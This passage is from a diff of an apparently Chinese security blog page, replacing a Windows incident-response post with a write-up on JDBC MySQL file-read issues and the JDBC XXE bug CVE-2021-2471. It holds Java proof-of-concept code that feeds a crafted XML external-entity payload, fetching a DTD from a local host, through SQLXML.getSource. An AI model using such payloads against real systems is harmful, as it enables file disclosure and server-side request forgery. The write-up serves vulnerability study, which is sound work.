class="operator">=</span> con.createStatement();  </span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">if</span> (rs.next()) &#123;  </span><br><span class="line">            xml = rs.getString(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        System.out.println(xml);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">SQLXML</span> <span class="variable">sqlxml</span> <span class="operator">=</span> con.createSQLXML();  </span><br><span class="line">        sqlxml.setString(xml);  </span><br><span class="line">        sqlxml.getSource(DOMSource.class);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在数据库中写入恶意xml</p>
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716101231.png"
-                     
-                ><br>可以查看内存字符串，如果是C2马可以看到外联的IP地址 <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716101247.png"
+                     data-src="/images/Pastedimage20251227164330.png"
                      
                 ></p>
-<h5 id="TCPView"><a href="#TCPView" class="headerlink" title="TCPView"></a>TCPView</h5><p><img  
+<p>成功触发XXE</p>
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/Pastedimage20250716101550.png"
+                     data-src="/images/Pastedimage20251227164436.png"
                      
                 ></p>
-<hr>
-<p>本文参考Chen_D师傅的文章</p>
+<h4 id="用户输入恶意数据导致XXE"><a href="#用户输入恶意数据导致XXE" class="headerlink" title="用户输入恶意数据导致XXE"></a>用户输入恶意数据导致XXE</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">db_ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">db_port</span> <span class="operator">=</span> <span class="string">&quot;3306&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">db_name</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">db_user</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">db_pass</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://&quot;</span>+db_ip+<span class="string">&quot;:&quot;</span>+db_port+<span class="string">&quot;/&quot;</span>+db_name+<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xxe</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;ISO-8859-1\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;!DOCTYPE foo [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;!ELEMENT foo ANY &gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;!ENTITY xxe SYSTEM \&quot;http://127.0.0.1:8888/test.dtd\&quot; &gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, db_user, db_pass);</span><br><span class="line">        <span class="type">SQLXML</span> <span class="variable">sqlxml</span> <span class="operator">=</span> con.createSQLXML();</span><br><span class="line">        sqlxml.setString(xxe);</span><br><span class="line">        sqlxml.getSource(DOMSource.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251227164743.png"
+                     
+                ></p>
 
 		</div>
 
@@ -612,18 +437,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> windows应急</li>
+        <li><strong>Title:</strong> JDBC mysql任意文件读取漏洞</li>
         <li><strong>Author:</strong> mapl3miss</li>
         <li><strong>Created at
-                :</strong> 2025-07-16 12:43:56</li>
+                :</strong> 2025-09-19 12:22:05</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-07-16 13:36:37
+                    :</strong> 2025-12-29 21:34:59
             </li>
         
         <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2025/07/16/windows应急/
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/09/19/JDBC-mysql任意文件读取漏洞/
         </li>
         <li>
             <strong>
@@ -645,7 +470,7 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">#应急响应</a>&nbsp;
+				<a href="/tags/javaSec/">#javaSec</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -657,17 +482,29 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/07/18/Linux%E5%BA%94%E6%80%A5/">
+				<a class="prev" rel="prev" href="/2025/09/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">Linux应急</span>
+						<span class="post-nav-title-item">JDBC反序列化漏洞</span>
 						<span class="post-nav-item">Prev posts</span>
 					</span>
 				</a>
 			</div>
 			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/11/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Jackson反序列化</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
 			
 		</div>
 		
@@ -724,8 +561,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">windows应急</div>
-		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="nav-text">相关命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-text">注册表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7"><span class="nav-text">系统账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97"><span class="nav-text">安全日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-text">工具</span></a></li></ol>
+		<div class="page-title">JDBC mysql任意文件读取漏洞</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-text">读文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDBC%E8%BF%9E%E6%8E%A5%E5%8F%82%E6%95%B0%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%8F%AF%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">JDBC连接参数不完全可控的绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JDBC-XXE-CVE-2021-2471"><span class="nav-text">JDBC XXE(CVE-2021-2471)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li></ol></li></ol></li></ol>
 
 	</div>
 </div>
